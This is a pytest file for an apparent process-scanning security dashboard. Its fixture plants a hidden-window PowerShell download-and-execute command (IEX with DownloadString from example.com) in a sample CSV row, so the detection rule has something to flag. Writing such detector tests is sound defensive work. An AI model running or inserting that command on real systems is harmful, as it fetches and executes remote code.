import csv
import os
import shutil
import tempfile


def _make_hidden_window_csv():
    tmpdir = tempfile.mkdtemp()
    csv_path = os.path.join(tmpdir, "processes.csv")
    with open(csv_path, "w", newline="") as fh:
        writer = csv.DictWriter(fh, fieldnames=["Name", "CommandLine", "ProcessId", "ParentProcessId", "ExecutablePath", "User"])
        writer.writeheader()
        writer.writerow({
            "Name": "powershell.exe",
            "CommandLine": r'powershell.exe -WindowStyle Hidden -Command "IEX (New-Object Net.WebClient).DownloadString(\'http://example.com/a.ps1\')"',
            "ProcessId": "4242",
            "ParentProcessId": "100",
            "ExecutablePath": r"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",
            "User": "CORP\\jdoe",
        })
    return tmpdir, csv_path


def test_full_scan_alert_incident_workflow(registered_client):
    tmpdir, csv_path = _make_hidden_window_csv()
    try:
        # Run a real scan against a real process-list CSV export with a hidden-window row
        resp = registered_client.post("/scan/run", data={"target_path": csv_path}, follow_redirects=True)
        assert resp.status_code == 200
        assert b"Scan complete" in resp.data
        assert b"1 findings" in resp.data or b"findings" in resp.data

        # Logs page should show the scan
        resp = registered_client.get("/logs")
        assert csv_path.encode() in resp.data

        # Alerts page should load and contain an alert (medium+ severity threshold by default)
        resp = registered_client.get("/alerts")
        assert resp.status_code == 200
        assert b"HWP-001" in resp.data

        # Analytics JSON endpoint returns real aggregated data
        resp = registered_client.get("/analytics/data")
        assert resp.status_code == 200
        assert resp.is_json
        data = resp.get_json()
        assert data["severity_breakdown"].get("high", 0) >= 1

        # Reports CSV export works
        resp = registered_client.get("/reports/export.csv")
        assert resp.status_code == 200
        assert resp.headers["Content-Type"].startswith("text/csv")
        assert b"HWP-001" in resp.data
    finally:
        shutil.rmtree(tmpdir)


def test_scan_detail_page_shows_matched_snippet(registered_client):
    tmpdir, csv_path = _make_hidden_window_csv()
    try:
        registered_client.post("/scan/run", data={"target_path": csv_path}, follow_redirects=True)
        resp = registered_client.get("/logs")
        assert resp.status_code == 200
        # Follow through to the scan detail page for scan #1
        resp = registered_client.get("/logs/1")
        assert resp.status_code == 200
        assert b"HWP-001" in resp.data
        assert b"WindowStyle" in resp.data or b"Hidden" in resp.data
    finally:
        shutil.rmtree(tmpdir)


def test_scan_run_without_target_path_flashes_error(registered_client):
    resp = registered_client.post("/scan/run", data={"target_path": ""}, follow_redirects=True)
    assert resp.status_code == 200
    assert b"Please provide" in resp.data


def test_settings_page_round_trip(registered_client):
    resp = registered_client.post("/settings", data={
        "default_scan_path": "/tmp/processes.csv",
        "scan_depth_limit": "3",
        "exclude_paths": "/tmp/excluded",
        "alert_on_severity": "high",
    }, follow_redirects=True)
    assert b"Settings saved" in resp.data

    resp = registered_client.get("/settings")
    assert b"/tmp/processes.csv" in resp.data


def test_all_nav_pages_load(registered_client):
    for path in ["/", "/logs", "/alerts", "/incidents", "/analytics", "/reports", "/settings"]:
        resp = registered_client.get(path)
        assert resp.status_code == 200, f"{path} failed with {resp.status_code}"


def test_404_page(registered_client):
    resp = registered_client.get("/this-page-does-not-exist")
    assert resp.status_code == 404
